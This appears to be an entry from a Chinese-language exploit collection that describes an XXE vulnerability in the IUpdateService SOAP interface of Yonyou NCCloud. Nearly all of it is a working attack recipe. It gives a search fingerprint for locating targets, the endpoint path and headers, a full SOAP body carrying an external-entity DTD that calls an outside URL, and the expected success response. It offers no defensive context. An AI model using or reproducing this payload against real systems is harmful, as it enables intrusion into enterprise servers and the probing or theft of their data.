# 用友NCCloudIUpdateService接口存在XXE漏洞

- **系统**：用友　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`icon_hash="1085941792"`
- **请求**：`POST /uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1`
- **关键头**：`SOAPAction: urn:getResult`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
<soapenv:Header/>
<soapenv:Body>
<iup:getResult>
<!--type: string-->
<iup:string><![CDATA[
<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://www.baidu.com">%aaa;%ccc;%ddd;]>
<xxx/>]]></iup:string>
</iup:getResult>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　getResultResponse